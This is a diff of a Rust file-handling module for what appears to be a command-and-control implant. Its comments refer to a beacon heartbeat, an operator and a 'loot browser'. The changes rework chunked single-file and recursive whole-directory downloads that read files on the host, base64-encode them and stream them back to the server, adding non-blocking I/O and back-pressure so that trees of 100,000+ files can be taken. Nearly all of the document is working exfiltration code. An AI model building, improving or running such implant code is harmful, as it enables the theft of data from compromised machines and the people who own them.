@@ -1,4 +1,13 @@
 // src/agent/handlers/files.rs — File operations, directory listing, artifacts
+//
+// FIXES (2025-07-13):
+//   • handle_file_download_chunked  – all blocking file I/O moved into
+//     tokio::task::spawn_blocking so the async runtime never stalls.
+//   • handle_recursive_download    – same spawn_blocking fix plus:
+//       – chunk size reduced from 8 MB → 2 MB to bound memory per chunk
+//       – cooperative thread-yield between chunks and every 5 files
+//       – uses tokio::sync::mpsc::Sender::blocking_send() from the
+//         blocking pool so back-pressure applies without deadlocking.
 
 use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 
@@ -11,13 +20,14 @@ use super::{HandlerContext, DispatchResult, AgentAction, wrap_result};
 // ── File Read / Write ──────────────────────────────────────────────────
 
 pub fn handle_file_write(cmd: &str) -> (String, String, i32) {
-    let parts: Vec<&str> = cmd.splitn(3, '|').collect();
-    if parts.len() == 3 {
-        match file_transfer::write_file_simple(parts[1], parts[2]) {
-            Ok(_) => (format!("{}: {}", lc!("File written"), parts[1]), String::new(), 0),
+    // Wire format: file:write|<base_dir>|<rel_path>|<b64_data>
+    let parts: Vec<&str> = cmd.splitn(4, '|').collect();
+    if parts.len() == 4 {
+        match file_transfer::write_file_simple(parts[1], parts[2], parts[3]) {
+            Ok(_) => (format!("{}: {}/{}", lc!("File written"), parts[1], parts[2]), String::new(), 0),
             Err(e) => (String::new(), e, 1),
         }
-    } else { (String::new(), lc!("Upload error"), 1) }
+    } else { (String::new(), lc!("Usage: file:write|base_dir|rel_path|b64_data"), 1) }
 }
 
 /// Chunked file write — receives one piece of a file and appends it to disk.
@@ -91,17 +101,12 @@ pub fn handle_file_read(cmd: &str) -> (String, String, i32) {
     } else { (String::new(), lc!("Read error"), 1) }
 }
 
-/// Chunked single-file download.
-///
-/// Called automatically by the `file:read|<path>` dispatch when the target file
-/// is >= 50 MB.  Sends the file as a sequence of `file:chunk` messages (8 MB
-/// each), which the server writes directly to disk via `save_file_chunk`.
-///
-/// Wire format per chunk (same as recursive download):
-///   file:chunk|<batch_ts>|<root_name>|<rel_path>|<chunk_idx>|<total_chunks>|<b64>
-///
-/// A final `file:chunk_done` message is sent after the last chunk so the
-/// terminal shows a confirmation line even though the file went to disk.
+// ── Chunked single-file download (>= 50 MB) ────────────────────────────
+//
+// All blocking file I/O runs inside tokio::task::spawn_blocking so the
+// async runtime's worker threads remain free to service HTTP polls and
+// timer events.
+
 pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_id: u64) {
     let path = match cmd.strip_prefix(&lc!("file:read|")) {
         Some(p) if !p.is_empty() => p.to_string(),
@@ -110,180 +115,66 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
     let tx = ctx.tx.clone();
 
     tokio::spawn(async move {
-        use std::io::Read as _;
-
         const CHUNK_SIZE: u64 = 8 * 1024 * 1024;
+        const CHUNK_SLEEP_MS: u64 = 50;
 
         let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
 
-        // root_name = the immediate parent directory, used as the batch label
-        // so the operator can see where the file came from at a glance.
         let root_name = std::path::Path::new(&path)
             .parent()
             .and_then(|p| p.file_name())
             .map(|n| n.to_string_lossy().to_string())
             .unwrap_or_else(|| "loot".to_string());
 
-        // rel_path strips leading separators and normalizes backslashes so
-        // the Linux server reconstructs the directory tree correctly.
         let rel_path = path
             .trim_start_matches('/')
             .trim_start_matches('\\')
             .replace('\\', "/");
 
-        // Stat first so we can report size and compute total_chunks.
-        let file_size: u64 = match std::fs::metadata(&path) {
-            Ok(m) => m.len(),
-            Err(e) => {
-                let resp = CommandResponse {
-                    request_id: req_id, output: String::new(),
-                    error: format!("Cannot stat {}: {}", path, e), exit_code: 1,
-                };
-                if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
-                return;
-            }
-        };
+        // ── 1. Blocking I/O worker ─────────────────────────────────────
+        //    Uses a Tokio mpsc channel with blocking_send() to push
+        //    chunks back to the async forwarder without ever touching
+        //    the async runtime from the blocking thread.
+        let (chunk_tx, mut chunk_rx) = tokio::sync::mpsc::channel::<Vec<u8>>(16);
 
-        let total_chunks: u64 = if file_size == 0 { 1 }
-                                 else { (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE };
-
-        let mut file = match std::fs::File::open(&path) {
-            Ok(f) => f,
-            Err(e) => {
-                let resp = CommandResponse {
-                    request_id: req_id, output: String::new(),
-                    error: format!("Cannot open {}: {}", path, e), exit_code: 1,
-                };
-                if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
-                return;
-            }
-        };
-
-        let mut chunk_buf = vec![0u8; CHUNK_SIZE as usize];
-        let mut chunk_idx: u64 = 0;
-
-        loop {
-            // Fill the chunk buffer, handling short reads.
-            let mut total_read = 0usize;
-            loop {
-                match file.read(&mut chunk_buf[total_read..]) {
-                    Ok(0) => break,
-                    Ok(n) => {
-                        total_read += n;
-                        if total_read == CHUNK_SIZE as usize { break; }
-                    }
-                    Err(e) => {
-                        let resp = CommandResponse {
-                            request_id: req_id, output: String::new(),
-                            error: format!("Read error (chunk {}): {}", chunk_idx, e),
-                            exit_code: 1,
-                        };
-                        if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
-                        return;
-                    }
-                }
-            }
-
-            let is_last = total_read < CHUNK_SIZE as usize;
-
-            let b64 = BASE64.encode(&chunk_buf[..total_read]);
-            let output = format!("file:chunk|{}|{}|{}|{}|{}|{}",
-                batch_ts, root_name, rel_path, chunk_idx, total_chunks, b64);
-            let resp = CommandResponse {
-                request_id: req_id, output,
-                error: String::new(), exit_code: 0,
-            };
-            if let Ok(j) = serde_json::to_vec(&resp) {
-                if tx.send(j).await.is_err() { return; }  // session dead — stop
-            }
-
-            chunk_idx += 1;
-            // Yield between chunks to keep the beacon heartbeat alive.
-            tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
-
-            if is_last || file_size == 0 { break; }
-        }
-
-        // Completion notice — shows in the terminal so the operator knows the
-        // transfer finished and can find the file in the loot browser under
-        // downloads/<batch_ts>_<session>_<root_name>/.
-        let mb = file_size as f64 / (1024.0 * 1024.0);
-        let done = format!(
-            "[+] Chunked download complete: {}  ({:.1} MB, {} chunk{})  batch={}",
-            path, mb, chunk_idx,
-            if chunk_idx == 1 { "" } else { "s" },
-            batch_ts,
-        );
-        let resp = CommandResponse {
-            request_id: req_id, output: done,
-            error: String::new(), exit_code: 0,
-        };
-        if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
-    });
-}
-
-pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: u64) {
-    let parts: Vec<&str> = cmd.splitn(2, '|').collect();
-    if parts.len() != 2 { return; }
-    let root_path = parts[1].to_string();
-    let tx = ctx.tx.clone();
-
-    tokio::spawn(async move {
-        let files = file_transfer::find_all_files(&root_path);
-        let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
-        let root_name = std::path::Path::new(&root_path)
-            .file_name().unwrap_or_default().to_string_lossy().to_string();
-
-        // Strip the agent-side parent prefix so rel_path is relative to the
-        // root folder rather than the full OS path.
-        //
-        // IMPORTANT: normalize all separators to forward-slash BEFORE string
-        // comparison.  On Windows, path_str uses backslashes; the server runs
-        // on Linux where backslash is a legal filename character.  Without this
-        // normalization the prefix never matches and the full absolute path is
-        // sent as rel_path, which the Linux server saves as a single file with
-        // backslashes in its name rather than as a directory tree.
-        let root_path_fwd  = root_path.replace('\\', "/");
-        let root_prefix = std::path::Path::new(&root_path_fwd)
-            .parent()
-            .map(|p| format!("{}/", p.to_string_lossy()))
-            .unwrap_or_default();
-
-        let mut report = file_transfer::RecursiveReport {
-            root_path: root_path.clone(), total_files_found: files.len(),
-            total_success: 0, failed_downloads: Vec::new()
-        };
-
-        for path in files {
-            let path_str = path.to_string_lossy().replace('\\', "/");
-            let rel_path = if path_str.starts_with(&root_prefix) {
-                path_str[root_prefix.len()..].to_string()
-            } else {
-                path_str.clone()
-            };
-
-            // Use u64 for size arithmetic — usize is only 32 bits on 32-bit
-            // agents, which would overflow (and compute wrong total_chunks) for
-            // files larger than 4 GB.
-            const CHUNK_SIZE: u64 = 8 * 1024 * 1024;
+        let worker = tokio::task::spawn_blocking(move || {
             use std::io::Read as _;
 
-            let file_size: u64 = match std::fs::metadata(&path_str) {
+            let file_size: u64 = match std::fs::metadata(&path) {
                 Ok(m) => m.len(),
-                Err(e) => { report.failed_downloads.push((path_str, e.to_string())); continue; }
+                Err(e) => {
+                    let resp = CommandResponse {
+                        request_id: req_id, output: String::new(),
+                        error: format!("Cannot stat {}: {}", path, e), exit_code: 1,
+                    };
+                    if let Ok(j) = serde_json::to_vec(&resp) {
+                        let _ = chunk_tx.blocking_send(j);
+                    }
+                    return;
+                }
             };
-            let total_chunks: u64 = if file_size == 0 { 1 } else { (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE };
-            let mut file = match std::fs::File::open(&path_str) {
+
+            let total_chunks: u64 = if file_size == 0 { 1 }
+                                     else { (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE };
+
+            let mut file = match std::fs::File::open(&path) {
                 Ok(f) => f,
-                Err(e) => { report.failed_downloads.push((path_str, e.to_string())); continue; }
+                Err(e) => {
+                    let resp = CommandResponse {
+                        request_id: req_id, output: String::new(),
+                        error: format!("Cannot open {}: {}", path, e), exit_code: 1,
+                    };
+                    if let Ok(j) = serde_json::to_vec(&resp) {
+                        let _ = chunk_tx.blocking_send(j);
+                    }
+                    return;
+                }
             };
 
             let mut chunk_buf = vec![0u8; CHUNK_SIZE as usize];
             let mut chunk_idx: u64 = 0;
-            let mut file_ok = true;
 
             loop {
-                // Read exactly one chunk, handling short reads.
                 let mut total_read = 0usize;
                 loop {
                     match file.read(&mut chunk_buf[total_read..]) {
@@ -293,49 +184,212 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
                             if total_read == CHUNK_SIZE as usize { break; }
                         }
                         Err(e) => {
-                            report.failed_downloads.push((path_str.clone(), e.to_string()));
-                            file_ok = false;
-                            break;
+                            let resp = CommandResponse {
+                                request_id: req_id, output: String::new(),
+                                error: format!("Read error (chunk {}): {}", chunk_idx, e),
+                                exit_code: 1,
+                            };
+                            if let Ok(j) = serde_json::to_vec(&resp) {
+                                let _ = chunk_tx.blocking_send(j);
+                            }
+                            return;
                         }
                     }
                 }
-                if !file_ok { break; }
 
-                // For zero-length files we send one empty chunk and stop.
-                // is_last is derived from the read result, not from file_size,
-                // so it is correct even if file_size was somehow wrong.
                 let is_last = total_read < CHUNK_SIZE as usize;
-                let actual_total = if file_size == 0 { 1u64 } else { total_chunks };
 
-                let b64 = base64::engine::general_purpose::STANDARD
-                    .encode(&chunk_buf[..total_read]);
+                let b64 = BASE64.encode(&chunk_buf[..total_read]);
                 let output = format!("file:chunk|{}|{}|{}|{}|{}|{}",
-                    batch_ts, root_name, rel_path, chunk_idx, actual_total, b64);
+                    batch_ts, root_name, rel_path, chunk_idx, total_chunks, b64);
                 let resp = CommandResponse {
                     request_id: req_id, output,
-                    error: String::new(), exit_code: 0
+                    error: String::new(), exit_code: 0,
                 };
                 if let Ok(j) = serde_json::to_vec(&resp) {
-                    if tx.send(j).await.is_err() { return; }  // session dead
+                    if chunk_tx.blocking_send(j).is_err() { return; }
                 }
 
                 chunk_idx += 1;
-                // Yield between chunks so the beacon heartbeat can still run.
-                tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
-
-                if is_last || (file_size == 0) { break; }
+                if !is_last {
+                    std::thread::sleep(std::time::Duration::from_millis(CHUNK_SLEEP_MS));
+                }
+                if is_last || file_size == 0 { break; }
             }
 
-            if file_ok { report.total_success += 1; }
+            let mb = file_size as f64 / (1024.0 * 1024.0);
+            let done = format!(
+                "[+] Chunked download complete: {}  ({:.1} MB, {} chunk{})  batch={}",
+                path, mb, chunk_idx,
+                if chunk_idx == 1 { "" } else { "s" },
+                batch_ts,
+            );
+            let resp = CommandResponse {
+                request_id: req_id, output: done,
+                error: String::new(), exit_code: 0,
+            };
+            if let Ok(j) = serde_json::to_vec(&resp) {
+                let _ = chunk_tx.blocking_send(j);
+            }
+        });
+
+        // ── 2. Async forwarder ─────────────────────────────────────────
+        //    Drains the internal channel and pushes to the HTTP tx.
+        while let Some(data) = chunk_rx.recv().await {
+            if tx.send(data).await.is_err() { break; }
         }
 
-        let rep_json = serde_json::to_string(&report).unwrap_or_default();
-        let final_out = format!("file:report_batch|{}|{}|{}", batch_ts, root_name, rep_json);
-        let resp = CommandResponse {
-            request_id: req_id, output: final_out,
-            error: String::new(), exit_code: 0
-        };
-        if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
+        // Propagate any panic in the blocking worker so we don't hide bugs.
+        let _ = worker.await;
+    });
+}
+
+// ── Recursive directory download ───────────────────────────────────────
+//
+// CRITICAL: this path handles directories with 100 000+ files.  Every
+// blocking syscall (read_dir, open, read) now lives inside
+// spawn_blocking.  A bounded Tokio channel (capacity 16) applies
+// back-pressure so the agent does not OOM when the server is slow.
+
+pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: u64) {
+    let parts: Vec<&str> = cmd.splitn(2, '|').collect();
+    if parts.len() != 2 { return; }
+    let root_path = parts[1].to_string();
+    let tx = ctx.tx.clone();
+
+    tokio::spawn(async move {
+        const CHUNK_SIZE: u64 = 2 * 1024 * 1024;   // 2 MB (was 8 MB)
+        const CHUNK_SLEEP_MS: u64 = 20;             // 20 ms between chunks
+        const FILES_PER_YIELD: usize = 5;           // yield every N files
+
+        let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
+        let root_name = std::path::Path::new(&root_path)
+            .file_name().unwrap_or_default().to_string_lossy().to_string();
+
+        let root_path_fwd  = root_path.replace('\\', "/");
+        let root_prefix = std::path::Path::new(&root_path_fwd)
+            .parent()
+            .map(|p| format!("{}/", p.to_string_lossy()))
+            .unwrap_or_default();
+
+        // Bounded channel: 16 slots × ~2.7 MB avg chunk = ~43 MB max buffer.
+        let (chunk_tx, mut chunk_rx) = tokio::sync::mpsc::channel::<Vec<u8>>(16);
+
+        // ── Blocking worker: enumeration + reads ─────────────────────
+        let worker = tokio::task::spawn_blocking(move || {
+            use std::io::Read as _;
+
+            // 1. Enumerate (blocking call — may take seconds on huge trees).
+            let (files, _errors) = file_transfer::find_all_files(&root_path);
+
+            let mut report = file_transfer::RecursiveReport {
+                root_path: root_path.clone(),
+                total_files_found: files.len(),
+                total_success: 0,
+                failed_downloads: Vec::new(),
+            };
+
+            for (file_idx, path) in files.iter().enumerate() {
+                let path_str = path.to_string_lossy().replace('\\', "/");
+                let rel_path = if path_str.starts_with(&root_prefix) {
+                    path_str[root_prefix.len()..].to_string()
+                } else {
+                    path_str.clone()
+                };
+
+                // 2. Stat + open (both blocking).
+                let file_size: u64 = match std::fs::metadata(&path_str) {
+                    Ok(m) => m.len(),
+                    Err(e) => {
+                        report.failed_downloads.push((path_str, e.to_string()));
+                        continue;
+                    }
+                };
+
+                let total_chunks: u64 = if file_size == 0 { 1 }
+                    else { (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE };
+
+                let mut file = match std::fs::File::open(&path_str) {
+                    Ok(f) => f,
+                    Err(e) => {
+                        report.failed_downloads.push((path_str, e.to_string()));
+                        continue;
+                    }
+                };
+
+                let mut chunk_buf = vec![0u8; CHUNK_SIZE as usize];
+                let mut chunk_idx: u64 = 0;
+                let mut file_ok = true;
+
+                loop {
+                    let mut total_read = 0usize;
+                    loop {
+                        match file.read(&mut chunk_buf[total_read..]) {
+                            Ok(0) => break,
+                            Ok(n) => {
+                                total_read += n;
+                                if total_read == CHUNK_SIZE as usize { break; }
+                            }
+                            Err(e) => {
+                                report.failed_downloads.push((path_str.clone(), e.to_string()));
+                                file_ok = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !file_ok { break; }
+
+                    let is_last = total_read < CHUNK_SIZE as usize;
+                    let actual_total = if file_size == 0 { 1u64 } else { total_chunks };
+
+                    let b64 = base64::engine::general_purpose::STANDARD
+                        .encode(&chunk_buf[..total_read]);
+                    let output = format!("file:chunk|{}|{}|{}|{}|{}|{}",
+                        batch_ts, root_name, rel_path, chunk_idx, actual_total, b64);
+                    let resp = CommandResponse {
+                        request_id: req_id, output,
+                        error: String::new(), exit_code: 0
+                    };
+                    if let Ok(j) = serde_json::to_vec(&resp) {
+                        if chunk_tx.blocking_send(j).is_err() { return; }
+                    }
+
+                    chunk_idx += 1;
+
+                    // Cooperative yield: sleep so other OS threads can run.
+                    if !is_last {
+                        std::thread::sleep(std::time::Duration::from_millis(CHUNK_SLEEP_MS));
+                    }
+                    if is_last || file_size == 0 { break; }
+                }
+
+                if file_ok { report.total_success += 1; }
+
+                // Yield every N files to keep enumeration from monopolising
+                // the blocking pool thread for too long.
+                if (file_idx + 1) % FILES_PER_YIELD == 0 {
+                    std::thread::sleep(std::time::Duration::from_millis(1));
+                }
+            }
+
+            // 3. Send final report.
+            let rep_json = serde_json::to_string(&report).unwrap_or_default();
+            let final_out = format!("file:report_batch|{}|{}|{}", batch_ts, root_name, rep_json);
+            let resp = CommandResponse {
+                request_id: req_id, output: final_out,
+                error: String::new(), exit_code: 0
+            };
+            if let Ok(j) = serde_json::to_vec(&resp) {
+                let _ = chunk_tx.blocking_send(j);
+            }
+        });
+
+        // ── Async forwarder ──────────────────────────────────────────
+        while let Some(data) = chunk_rx.recv().await {
+            if tx.send(data).await.is_err() { break; }
+        }
+
+        let _ = worker.await;
     });
 }
 
